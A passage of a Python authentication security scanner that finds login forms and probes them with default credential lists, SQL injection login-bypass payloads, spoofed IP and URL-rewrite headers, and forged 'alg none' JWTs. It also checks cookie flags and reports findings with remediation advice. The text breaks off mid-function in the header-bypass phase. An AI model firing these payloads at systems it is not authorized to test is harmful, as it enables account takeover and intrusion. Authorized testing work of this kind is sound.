#!/usr/bin/env python3
"""
Authentication Security Tester - Login Form, Default Credentials, JWT Analysis
Session cookie security, auth bypass via headers, SQL injection in login fields.
"""

import asyncio
import argparse
import base64
import json
import logging
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from html.parser import HTMLParser
from pathlib import Path
from typing import Optional

try:
    import aiohttp
    from tqdm import tqdm
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install -r requirements.txt")
    sys.exit(1)


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("auth_tester")


# ---------------------------------------------------------------------------
# Constants & Payloads
# ---------------------------------------------------------------------------

LOGIN_PATHS = [
    "/", "/login", "/signin", "/auth", "/account/login",
    "/user/login", "/admin/login", "/wp-login.php",
    "/admin", "/administrator", "/manager", "/console",
    "/api/login", "/api/auth/login", "/api/v1/login",
    "/api/v1/auth/login", "/oauth/login", "/sso/login",
]

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "123456"),
    ("test", "test"),
    ("test", "password"),
    ("test", "123456"),
    ("guest", "guest"),
    ("guest", "password"),
    ("guest", ""),
    ("user", "user"),
    ("user", "password"),
    ("user", "123456"),
    ("demo", "demo"),
    ("demo", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("admin", "pass"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "monkey"),
    ("admin", "master"),
    ("admin", "qwerty"),
    ("admin", "abc123"),
]

SQLI_LOGIN_PAYLOADS = [
    ("admin'--", "anything"),
    ("admin' OR '1'='1", "anything"),
    ("admin' OR '1'='1'--", "anything"),
    ("admin' OR '1'='1'/*", "anything"),
    ("' OR '1'='1'--", "anything"),
    ("' OR 1=1--", "anything"),
    ("admin", "' OR '1'='1"),
    ("admin", "' OR 1=1--"),
    ("admin", "' OR 1=1#"),
    ("' OR ''='", "anything"),
    ("admin') OR ('1'='1", "anything"),
    ("1' OR '1'='1' LIMIT 1--", "anything"),
    ("admin' AND 1=1--", "anything"),
    ("admin' AND 1=2--", "anything"),
    ("admin'/**/OR/**/1=1--", "anything"),
    ("admin' UNION SELECT 1--", "anything"),
]

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"Microsoft OLE DB Provider for",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"SQLite/JDBCDriver",
    r"SQLSTATE\[",
    r"Invalid column name",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"mysql_fetch",
    r"sqlite3\.OperationalError",
    r"pg_query\(\).*failed",
    r"com\.mysql\.jdbc",
]

SUCCESS_INDICATORS = [
    "dashboard", "welcome", "profile", "account", "logout",
    "sign out", "signout", "settings", "my account", "home",
    "admin panel", "control panel", "manage", "administration",
]

FAILURE_INDICATORS = [
    "invalid", "incorrect", "wrong", "failed", "error",
    "denied", "unauthorized", "forbidden", "not found",
    "mismatch", "bad credentials", "login failed",
]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},  # admin:password
]

JWT_ALG_NONE_PAYLOADS = [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
]

SENSITIVE_JWT_CLAIMS = [
    "password", "secret", "token", "api_key", "apikey",
    "private_key", "credit_card", "ssn", "social_security",
    "bank_account", "pin", "security_code",
]


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    request_method: str = ""
    header: str = ""
    response_code: int = 0
    response_time: float = 0.0
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = asdict(self)
        return {k: v for k, v in d.items() if v}


@dataclass
class LoginForm:
    url: str
    action: str
    method: str
    username_field: str = ""
    password_field: str = ""
    other_fields: list = field(default_factory=list)
    hidden_fields: dict = field(default_factory=dict)
    has_csrf: bool = False
    csrf_field: str = ""
    csrf_value: str = ""


@dataclass
class TestResults:
    target: str
    timestamp: str
    login_forms_found: int = 0
    findings: list = field(default_factory=list)
    tests_run: dict = field(default_factory=dict)
    duration_seconds: float = 0.0
    errors: list = field(default_factory=list)

    def to_dict(self) -> dict:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            sev = f.severity if hasattr(f, "severity") else f.get("severity", "info")
            if sev in counts:
                counts[sev] += 1
        return {
            "target": self.target,
            "timestamp": self.timestamp,
            "login_forms_found": self.login_forms_found,
            "findings": [f.to_dict() if hasattr(f, "to_dict") else f for f in self.findings],
            "summary": {
                "total_findings": len(self.findings),
                **counts,
                "tests_run": self.tests_run,
                "duration_seconds": self.duration_seconds,
                "errors": len(self.errors),
            },
        }


# ---------------------------------------------------------------------------
# Progress Bar
# ---------------------------------------------------------------------------

class ProgressBar:
    def __init__(self, total: int, desc: str):
        self.total = total
        self.current = 0
        self.desc = desc
        self.start_time = time.time()
        self.tqdm = tqdm(total=total, desc=desc, unit="item", ncols=80)

    def update(self, n: int = 1):
        self.current += n
        self.tqdm.update(n)

    def finish(self):
        self.tqdm.close()
        elapsed = time.time() - self.start_time
        logger.info(f"{self.desc} completed in {elapsed:.1f}s")


# ---------------------------------------------------------------------------
# Login Form Parser
# ---------------------------------------------------------------------------

class LoginFormParser(HTMLParser):
    """Extract login forms from HTML."""

    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url
        self.forms: list[LoginForm] = []
        self._current: Optional[dict] = None
        self._tag_stack: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, Optional[str]]]):
        attr_dict = {k.lower(): (v or "") for k, v in attrs}
        self._tag_stack.append(tag)

        if tag == "form":
            action = attr_dict.get("action", self.base_url)
            if action and not action.startswith(("http://", "https://", "data:")):
                action = urllib.parse.urljoin(self.base_url, action)
            method = attr_dict.get("method", "post").lower()
            self._current = {
                "url": self.base_url,
                "action": action,
                "method": method,
                "fields": [],
                "has_csrf": False,
                "csrf_field": "",
                "csrf_value": "",
            }

        elif self._current is not None:
            if tag == "input":
                name = attr_dict.get("name", "")
                input_type = attr_dict.get("type", "text").lower()
                value = attr_dict.get("value", "")
                if name:
                    self._current["fields"].append({
                        "name": name,
                        "type": input_type,
                        "value": value,
                    })
                    name_lower = name.lower()
                    if any(t in name_lower for t in ("csrf", "token", "_token", "nonce")):
                        self._current["has_csrf"] = True
                        self._current["csrf_field"] = name
                        self._current["csrf_value"] = value

    def handle_endtag(self, tag: str):
        if self._tag_stack and self._tag_stack[-1] == tag:
            self._tag_stack.pop()

        if tag == "form" and self._current is not None:
            fields = self._current["fields"]
            username_field = ""
            password_field = ""
            other_fields = []
            hidden_fields = {}

            for f in fields:
                fname = f["name"].lower()
                ftype = f["type"]

                if ftype == "hidden":
                    hidden_fields[f["name"]] = f["value"]

                if not username_field and (
                    ftype == "text" or ftype == "email"
                    or any(k in fname for k in ("user", "login", "email", "account", "name"))
                ):
                    username_field = f["name"]
                elif not password_field and (
                    ftype == "password"
                    or any(k in fname for k in ("pass", "pwd", "secret"))
                ):
                    password_field = f["name"]
                else:
                    if ftype not in ("submit", "button", "hidden"):
                        other_fields.append(f["name"])

            if password_field or username_field:
                form = LoginForm(
                    url=self._current["url"],
                    action=self._current["action"],
                    method=self._current["method"],
                    username_field=username_field,
                    password_field=password_field,
                    other_fields=other_fields,
                    hidden_fields=hidden_fields,
                    has_csrf=self._current["has_csrf"],
                    csrf_field=self._current["csrf_field"],
                    csrf_value=self._current["csrf_value"],
                )
                self.forms.append(form)

            self._current = None


# ---------------------------------------------------------------------------
# Login Form Discovery
# ---------------------------------------------------------------------------

class LoginDiscovery:
    """Discover login forms on target."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _fetch(self, url: str) -> Optional[str]:
        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get("Content-Type", "")
                        if "text/html" in content_type:
                            return await resp.text(errors="ignore")
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
        return None

    async def discover(self, base_url: str) -> list[LoginForm]:
        """Discover login forms across common paths."""
        forms = []
        base = base_url.rstrip("/")
        parsed = urllib.parse.urlparse(base)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        logger.info(f"Discovering login forms at {origin}")

        progress = ProgressBar(len(LOGIN_PATHS), "Form discovery")
        for path in LOGIN_PATHS:
            url = f"{origin}{path}"
            html = await self._fetch(url)
            if html:
                parser = LoginFormParser(url)
                try:
                    parser.feed(html)
                except Exception:
                    pass
                for form in parser.forms:
                    if form not in forms:
                        forms.append(form)
            progress.update()
        progress.finish()

        logger.info(f"Found {len(forms)} login form(s)")
        return forms


# ---------------------------------------------------------------------------
# Default Credential Tester
# ---------------------------------------------------------------------------

class DefaultCredentialTester:
    """Test for default credentials on login forms."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit_login(
        self, form: LoginForm, username: str, password: str
    ) -> tuple[int, str, str, float]:
        """Submit a login form and return status, body, redirect_url, time."""
        data = {}
        if form.username_field:
            data[form.username_field] = username
        if form.password_field:
            data[form.password_field] = password

        for name, value in form.hidden_fields.items():
            if name.lower() not in ("csrf", "token", "_token"):
                data[name] = value

        if form.has_csrf:
            data[form.csrf_field] = form.csrf_value

        async with self._semaphore:
            start = time.time()
            try:
                if form.method == "get":
                    async with self.session.get(
                        form.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        redirect = str(resp.url)
                        return resp.status, body, redirect, time.time() - start
                else:
                    async with self.session.post(
                        form.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        redirect = str(resp.url)
                        return resp.status, body, redirect, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", "", time.time() - start

    def _check_success(self, body: str, redirect_url: str, status: int) -> bool:
        """Check if login appears successful."""
        body_lower = body.lower()
        redirect_lower = redirect_url.lower()

        if any(ind in body_lower for ind in SUCCESS_INDICATORS):
            return True
        if any(ind in redirect_lower for ind in ("dashboard", "admin", "panel", "home", "account", "welcome")):
            return True
        return False

    def _check_failure(self, body: str) -> bool:
        """Check if login explicitly failed."""
        body_lower = body.lower()
        return any(ind in body_lower for ind in FAILURE_INDICATORS)

    async def test(self, form: LoginForm) -> list[Finding]:
        """Test default credentials on a login form."""
        findings = []

        if not form.username_field or not form.password_field:
            logger.info(f"Skipping default creds test - missing username/password field at {form.action}")
            return findings

        progress = ProgressBar(len(DEFAULT_CREDENTIALS), "Default credentials")
        for username, password in DEFAULT_CREDENTIALS:
            status, body, redirect, resp_time = await self._submit_login(form, username, password)

            if status == 0:
                progress.update()
                continue

            if self._check_success(body, redirect, status) and not self._check_failure(body):
                findings.append(Finding(
                    vuln_type="Default Credentials",
                    severity=Severity.CRITICAL,
                    url=form.action,
                    parameter=form.username_field,
                    payload=f"{username}:{password}",
                    evidence=f"HTTP {status}, redirect: {redirect[:100]}",
                    description=f"Login successful with default credentials '{username}:{password}'.",
                    remediation="Change all default credentials immediately. Implement account lockout. Enforce strong password policies.",
                    request_method=form.method.upper(),
                    response_code=status,
                    response_time=resp_time,
                ))
                logger.warning(f"DEFAULT CREDENTIALS FOUND: {username}:{password} at {form.action}")
                progress.update()
                break

            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# SQL Injection Login Tester
# ---------------------------------------------------------------------------

class SQLInjectionLoginTester:
    """Test login forms for SQL injection authentication bypass."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit_login(
        self, form: LoginForm, username: str, password: str
    ) -> tuple[int, str, str, float]:
        data = {}
        if form.username_field:
            data[form.username_field] = username
        if form.password_field:
            data[form.password_field] = password

        for name, value in form.hidden_fields.items():
            data[name] = value

        if form.has_csrf:
            data[form.csrf_field] = form.csrf_value

        async with self._semaphore:
            start = time.time()
            try:
                if form.method == "get":
                    async with self.session.get(
                        form.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        redirect = str(resp.url)
                        return resp.status, body, redirect, time.time() - start
                else:
                    async with self.session.post(
                        form.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        redirect = str(resp.url)
                        return resp.status, body, redirect, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", "", time.time() - start

    def _check_sql_error(self, body: str) -> Optional[str]:
        body_lower = body.lower()
        for pattern in SQL_ERROR_PATTERNS:
            match = re.search(pattern, body_lower, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _check_success(self, body: str, redirect_url: str) -> bool:
        body_lower = body.lower()
        redirect_lower = redirect_url.lower()
        if any(ind in body_lower for ind in SUCCESS_INDICATORS):
            return True
        if any(ind in redirect_lower for ind in ("dashboard", "admin", "panel", "home", "account", "welcome")):
            return True
        return False

    async def test(self, form: LoginForm) -> list[Finding]:
        findings = []

        if not form.username_field:
            return findings

        progress = ProgressBar(len(SQLI_LOGIN_PAYLOADS), "SQL injection login")

        for username, password in SQLI_LOGIN_PAYLOADS:
            status, body, redirect, resp_time = await self._submit_login(form, username, password)

            if status == 0:
                progress.update()
                continue

            sql_error = self._check_sql_error(body)
            if sql_error:
                findings.append(Finding(
                    vuln_type="SQL Injection (Login Bypass - Error)",
                    severity=Severity.CRITICAL,
                    url=form.action,
                    parameter=form.username_field,
                    payload=f"username={username}, password={password}",
                    evidence=f"SQL error: {sql_error}",
                    description=f"SQL injection error detected in login form. Payload: {username}",
                    remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                    request_method=form.method.upper(),
                    response_code=status,
                    response_time=resp_time,
                ))
                progress.update()
                continue

            if self._check_success(body, redirect):
                findings.append(Finding(
                    vuln_type="SQL Injection (Login Bypass - Auth Bypass)",
                    severity=Severity.CRITICAL,
                    url=form.action,
                    parameter=form.username_field,
                    payload=f"username={username}, password={password}",
                    evidence=f"Login bypassed with SQLi payload (HTTP {status})",
                    description=f"Authentication bypassed via SQL injection. Payload: {username}",
                    remediation="Use parameterized queries. Validate and sanitize inputs. Implement multi-factor authentication.",
                    request_method=form.method.upper(),
                    response_code=status,
                    response_time=resp_time,
                ))
                logger.warning(f"SQL INJECTION BYPASS: {username} at {form.action}")

            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# Session Cookie Analyzer
# ---------------------------------------------------------------------------

class SessionCookieAnalyzer:
    """Analyze session cookies for security weaknesses."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def analyze(self, url: str) -> list[Finding]:
        findings = []

        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    headers = dict(resp.headers)
                    cookies = resp.cookies
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return findings

        for cookie_name, cookie in cookies.items():
            cookie_str = str(cookie)

            has_httponly = cookie.get("httponly", False)
            has_secure = cookie.get("secure", False)
            samesite = cookie.get("samesite", "")

            if not has_httponly:
                findings.append(Finding(
                    vuln_type="Cookie Missing HttpOnly Flag",
                    severity=Severity.MEDIUM,
                    url=url,
                    header="Set-Cookie",
                    payload=cookie_name,
                    evidence=f"Cookie '{cookie_name}' lacks HttpOnly flag",
                    description=f"Session cookie '{cookie_name}' is accessible to JavaScript, increasing XSS attack impact.",
                    remediation="Set HttpOnly flag on all session cookies to prevent JavaScript access.",
                    details={"cookie": cookie_name, "httponly": has_httponly},
                ))

            if not has_secure:
                findings.append(Finding(
                    vuln_type="Cookie Missing Secure Flag",
                    severity=Severity.MEDIUM,
                    url=url,
                    header="Set-Cookie",
                    payload=cookie_name,
                    evidence=f"Cookie '{cookie_name}' lacks Secure flag",
                    description=f"Cookie '{cookie_name}' can be transmitted over unencrypted HTTP.",
                    remediation="Set Secure flag on all cookies to ensure they are only sent over HTTPS.",
                    details={"cookie": cookie_name, "secure": has_secure},
                ))

            if not samesite:
                findings.append(Finding(
                    vuln_type="Cookie Missing SameSite Attribute",
                    severity=Severity.LOW,
                    url=url,
                    header="Set-Cookie",
                    payload=cookie_name,
                    evidence=f"Cookie '{cookie_name}' lacks SameSite attribute",
                    description=f"Cookie '{cookie_name}' has no SameSite attribute, defaulting to Lax in modern browsers.",
                    remediation="Set SameSite=Strict or SameSite=Lax on all cookies.",
                    details={"cookie": cookie_name, "samesite": samesite},
                ))

            if "session" in cookie_name.lower() or "jwt" in cookie_name.lower():
                if not has_httponly or not has_secure:
                    findings.append(Finding(
                        vuln_type="Weak Session Cookie Configuration",
                        severity=Severity.HIGH,
                        url=url,
                        header="Set-Cookie",
                        payload=cookie_name,
                        evidence=f"Session cookie '{cookie_name}' has weak security flags",
                        description="Session cookie lacks critical security flags, making it vulnerable to theft via XSS or network interception.",
                        remediation="Set HttpOnly, Secure, and SameSite=Strict on all session cookies.",
                        details={"cookie": cookie_name, "httponly": has_httponly, "secure": has_secure},
                    ))

        return findings


# ---------------------------------------------------------------------------
# JWT Token Analyzer
# ---------------------------------------------------------------------------

class JWTAnalyzer:
    """Analyze JWT tokens for weaknesses."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    def _decode_jwt_payload(self, token: str) -> Optional[dict]:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            payload_b64 = parts[1]
            padding = 4 - len(payload_b64) % 4
            if padding != 4:
                payload_b64 += "=" * padding
            payload_bytes = base64.urlsafe_b64decode(payload_b64)
            return json.loads(payload_bytes)
        except Exception:
            return None

    def _check_algorithm(self, token: str) -> Optional[Finding]:
        try:
            parts = token.split(".")
            header_b64 = parts[0]
            padding = 4 - len(header_b64) % 4
            if padding != 4:
                header_b64 += "=" * padding
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            alg = header.get("alg", "")
            if alg.lower() == "none":
                return Finding(
                    vuln_type="JWT None Algorithm",
                    severity=Severity.CRITICAL,
                    url="",
                    payload=alg,
                    evidence="JWT uses 'none' algorithm - signature verification can be bypassed",
                    description="JWT uses the 'none' algorithm, allowing attackers to forge tokens without a secret key.",
                    remediation="Reject tokens with 'none' algorithm. Only allow strong algorithms (RS256, ES256).",
                    details={"algorithm": alg, "header": header},
                )

            if alg.lower() in ("hs256", "hs384", "hs512"):
                return Finding(
                    vuln_type="JWT Weak Algorithm (HMAC)",
                    severity=Severity.LOW,
                    url="",
                    payload=alg,
                    evidence=f"JWT uses HMAC algorithm: {alg}",
                    description=f"JWT uses HMAC algorithm {alg}. If the secret is weak, tokens can be cracked.",
                    remediation="Consider using asymmetric algorithms (RS256, ES256). Use strong, random secrets.",
                    details={"algorithm": alg},
                )

        except Exception:
            pass
        return None

    def _check_expiration(self, payload: dict) -> Optional[Finding]:
        exp = payload.get("exp")
        if exp:
            try:
                exp_dt = datetime.utcfromtimestamp(exp)
                if exp_dt < datetime.utcnow():
                    return Finding(
                        vuln_type="JWT Expired Token",
                        severity=Severity.INFO,
                        url="",
                        evidence=f"Token expired at {exp_dt.isoformat()}",
                        description="The JWT token has expired.",
                        remediation="Implement proper token expiration and refresh mechanisms.",
                        details={"exp": exp, "expired_at": exp_dt.isoformat()},
                    )
                else:
                    days_until = (exp_dt - datetime.utcnow()).days
                    if days_until > 365:
                        return Finding(
                            vuln_type="JWT Long Expiration",
                            severity=Severity.LOW,
                            url="",
                            evidence=f"Token expires in {days_until} days",
                            description=f"JWT has a long expiration time ({days_until} days).",
                            remediation="Keep token lifetimes short (15-60 minutes). Use refresh tokens.",
                            details={"exp": exp, "days_until_expiry": days_until},
                        )
            except (ValueError, OSError):
                pass
        return None

    def _check_sensitive_data(self, payload: dict) -> Optional[Finding]:
        sensitive_found = []
        for key, value in payload.items():
            key_lower = key.lower()
            if any(s in key_lower for s in SENSITIVE_JWT_CLAIMS):
                sensitive_found.append(key)
            if isinstance(value, str) and len(value) > 20:
                if any(c in value.lower() for c in ("key", "secret", "token", "password")):
                    sensitive_found.append(key)

        if sensitive_found:
            return Finding(
                vuln_type="JWT Sensitive Data in Payload",
                severity=Severity.HIGH,
                url="",
                payload=json.dumps(payload, indent=2)[:500],
                evidence=f"Sensitive fields found: {', '.join(sensitive_found)}",
                description=f"JWT payload contains sensitive data: {', '.join(sensitive_found)}. JWT payloads are base64-encoded, not encrypted.",
                remediation="Do not store sensitive data in JWT payloads. Use token introspection or encrypted tokens.",
                details={"sensitive_fields": sensitive_found},
            )
        return None

    async def analyze_token(self, token: str, url: str = "") -> list[Finding]:
        findings = []

        payload = self._decode_jwt_payload(token)
        if not payload:
            return findings

        alg_finding = self._check_algorithm(token)
        if alg_finding:
            alg_finding.url = url
            findings.append(alg_finding)

        exp_finding = self._check_expiration(payload)
        if exp_finding:
            exp_finding.url = url
            findings.append(exp_finding)

        data_finding = self._check_sensitive_data(payload)
        if data_finding:
            data_finding.url = url
            findings.append(data_finding)

        findings.append(Finding(
            vuln_type="JWT Token Found",
            severity=Severity.INFO,
            url=url,
            payload=token[:100] + "..." if len(token) > 100 else token,
            evidence=f"JWT payload keys: {list(payload.keys())}",
            description="JWT token detected in application responses.",
            remediation="Ensure JWT tokens are transmitted securely and stored in HttpOnly cookies.",
            details={"payload_keys": list(payload.keys())},
        ))

        return findings

    async def scan_for_tokens(self, url: str) -> list[Finding]:
        findings = []
        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    body = await resp.text(errors="ignore")
                    headers = dict(resp.headers)
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return findings

        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9\-._~+/]+=*\.eyJ[A-Za-z0-9\-._~+/]+=*\.[A-Za-z0-9\-._~+/]+=*')
        tokens = jwt_pattern.findall(body)

        for token in set(tokens):
            token_findings = await self.analyze_token(token, url)
            findings.extend(token_findings)

        set_cookie = headers.get("Set-Cookie", "")
        for cookie_part in set_cookie.split(","):
            if "eyJ" in cookie_part:
                match = re.search(r'eyJ[A-Za-z0-9\-._~+/]+=*\.eyJ[A-Za-z0-9\-._~+/]+=*\.[A-Za-z0-9\-._~+/]+=*', cookie_part)
                if match:
                    token_findings = await self.analyze_token(match.group(0), url)
                    findings.extend(token_findings)

        return findings


# ---------------------------------------------------------------------------
# Auth Bypass Header Tester
# ---------------------------------------------------------------------------

class AuthBypassHeaderTester:
    """Test authentication bypass via headers."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def test(
        self, url: str, protected_url: str = None
    ) -> list[Finding]:
        findings = []
        test_url = protected_url or url

        progress = ProgressBar(len(AUTH_BYPASS_HEADERS), "Auth bypass headers")

        for headers in AUTH_BYPASS_HEADERS:
            async with self._semaphore:
                start = time.time()
                try:
                    async with self.session.get(
                        test_url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=False,
                    ) as resp:
                        status = resp.status
                        body = await resp.text(errors="ignore")
                        resp_time = time.time() - start

                        header_name = list(headers.keys())[0]
                        header_val = list(headers.values())[0]

                        if status in (200, 201, 301, 302):
                            body_lower = body.lower()
                            is_login_page = any(k in body_lower for k in ("login", "sign in", "password", "username"))
                            is_dashboard = any(k in body_lower for k in ("dashboard", "welcome", "admin", "panel"))

                            if not is_login_page and (status in (200, 201)):
                                findings.append(Finding(
                                    vuln_type="Authentication Bypass (Header)",
                                    severity=Severity.CRITICAL,
                                    url=test_url,
                                    header=header_name,
                                    payload=f"{header_name}: {header_val}",
                                    evidence=f"HTTP {status} with header manipulation",
                                    description=f"Authentication potentially bypassed via {header_name} header.",
                                    remediation=f"Do not trust {header_name} header for authentication. Validate auth server-side.",
                                    response_code=status,
                                    response_time=resp_time,
                                    details={"header": header_name, "value": header_val},
                                ))
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass

            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# Main Orchestrator
# ---------------------------------------------------------------------------

class AuthTester:
    """Orchestrate all authentication security tests."""

    def __init__(
        self,
        target: str,
        output: str = None,
        rate_limit: float = 5.0,
        timeout: int = 15,
        test_default_creds: bool = True,
        test_sqli: bool = True,
        test_cookies: bool = True,
        test_jwt: bool = True,
        test_headers: bool = True,
    ):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.output = output or f"auth_test_{urllib.parse.urlparse(self.target).netloc.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.test_flags = {
            "default_creds": test_default_creds,
            "sqli": test_sqli,
            "cookies": test_cookies,
            "jwt": test_jwt,
            "headers": test_headers,
        }
        self.results = TestResults(
            target=self.target,
            timestamp=datetime.utcnow().isoformat() + "Z",
        )
        self._session: Optional[aiohttp.ClientSession] = None

    async def _create_session(self) -> aiohttp.ClientSession:
        connector = aiohttp.TCPConnector(limit=self.rate_limit, ssl=False)
        return aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "AuthTester/1.0 (Security Testing)",
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Accept-Language": "en-US,en;q=0.9",
            },
        )

    async def run(self) -> dict:
        logger.info(f"Starting authentication security test for {self.target}")
        start_time = time.time()

        self._session = await self._create_session()

        try:
            # Phase 1: Discover login forms
            logger.info("=" * 60)
            logger.info("Phase 1: Login Form Discovery")
            logger.info("=" * 60)
            discovery = LoginDiscovery(self._session, self.rate_limit)
            forms = await discovery.discover(self.target)
            self.results.login_forms_found = len(forms)

            # Phase 2: Default Credentials
            if self.test_flags["default_creds"] and forms:
                logger.info("=" * 60)
                logger.info("Phase 2: Default Credential Testing")
                logger.info("=" * 60)
                cred_tester = DefaultCredentialTester(self._session, self.rate_limit)
                cred_progress = ProgressBar(len(forms), "Default creds")
                for form in forms:
                    findings = await cred_tester.test(form)
                    self.results.findings.extend(findings)
                    cred_progress.update()
                cred_progress.finish()
                self.results.tests_run["default_credentials"] = len(forms)

            # Phase 3: SQL Injection in Login
            if self.test_flags["sqli"] and forms:
                logger.info("=" * 60)
                logger.info("Phase 3: SQL Injection in Login Fields")
                logger.info("=" * 60)
                sqli_tester = SQLInjectionLoginTester(self._session, self.rate_limit)
                sqli_progress = ProgressBar(len(forms), "SQLi login")
                for form in forms:
                    findings = await sqli_tester.test(form)
                    self.results.findings.extend(findings)
                    sqli_progress.update()
                sqli_progress.finish()
                self.results.tests_run["sqli_login"] = len(forms)

            # Phase 4: Session Cookie Analysis
            if self.test_flags["cookies"]:
                logger.info("=" * 60)
                logger.info("Phase 4: Session Cookie Analysis")
                logger.info("=" * 60)
                cookie_analyzer = SessionCookieAnalyzer(self._session, self.rate_limit)
                cookie_progress = ProgressBar(max(len(forms), 1), "Cookie analysis")
                urls_to_check = [self.target]
                if forms:
                    urls_to_check.extend(f.action for f in forms)
                for url in set(urls_to_check):
                    findings = await cookie_analyzer.analyze(url)
                    self.results.findings.extend(findings)
                    cookie_progress.update()
                cookie_progress.finish()
                self.results.tests_run["cookie_analysis"] = len(self.results.findings)

            # Phase 5: JWT Analysis
            if self.test_flags["jwt"]:
                logger.info("=" * 60)
                logger.info("Phase 5: JWT Token Analysis")
                logger.info("=" * 60)
                jwt_analyzer = JWTAnalyzer(self._session, self.rate_limit)
                jwt_findings = await jwt_analyzer.scan_for_tokens(self.target)
                self.results.findings.extend(jwt_findings)
                self.results.tests_run["jwt_analysis"] = len(jwt_findings)

            # Phase 6: Auth Bypass Headers
            if self.test_flags["headers"]:
                logger.info("=" * 60)
                logger.info("Phase 6: Auth Bypass via Headers")
                logger.info("=" * 60)
                header_tester = AuthBypassHeaderTester(self._session, self.rate_limit)
                bypass_findings = await header_tester.test(self.target)
